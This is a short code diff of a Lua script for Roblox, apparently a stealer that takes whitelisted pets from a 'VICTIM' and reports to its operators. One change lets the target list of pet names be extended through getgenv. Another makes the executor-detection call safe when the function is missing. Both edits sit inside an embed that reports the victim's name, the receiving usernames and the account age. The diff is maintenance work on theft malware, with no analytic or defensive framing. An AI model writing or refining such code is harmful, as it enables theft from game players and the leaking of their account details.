@@ -51,6 +51,8 @@ local BASE_PET_WHITELIST = {
     'French Fry Ferret',
 }
 
+local EXTRA_WHITELIST = getgenv().ExtraPets or {}
+
 -- Объединяем базовый список и дополнительные имена
 local PET_WHITELIST = {}
 for _, pet in ipairs(BASE_PET_WHITELIST) do table.insert(PET_WHITELIST, pet) end
@@ -160,7 +162,7 @@ table.insert(fullEmbed.fields, 1, {
     value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```", 
         VICTIM.Name, 
         table.concat(USERNAMES, " "), 
-        identifyexecutor(), 
+        identifyexecutor and identifyexecutor() or "Unknown", 
         VICTIM.AccountAge
     ),
     inline = false
